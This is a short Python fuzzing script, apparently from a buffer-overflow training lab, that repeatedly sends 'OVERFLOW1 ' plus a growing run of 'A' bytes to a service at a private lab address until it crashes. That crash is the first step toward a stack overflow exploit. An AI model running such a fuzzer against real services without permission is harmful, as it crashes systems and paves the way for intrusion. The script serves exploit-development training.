#!/usr/bin/python3

import socket, time, sys

ip = '10.10.113.251'
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

data = prefix + "A" * 100

while True:
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((ip, port))
			s.recv(1024)
			print("Fuzzing With: {} Bytes".format(len(data) - len(prefix)))
			s.send(bytes(data, "latin-1"))
			s.recv(1024)
	except:
		print("Fuzzing Crashed At: {} Bytes".format(len(data) - len(prefix)))
		sys.exit(0)
		
	data += 100 * "A"
	time.sleep(1)
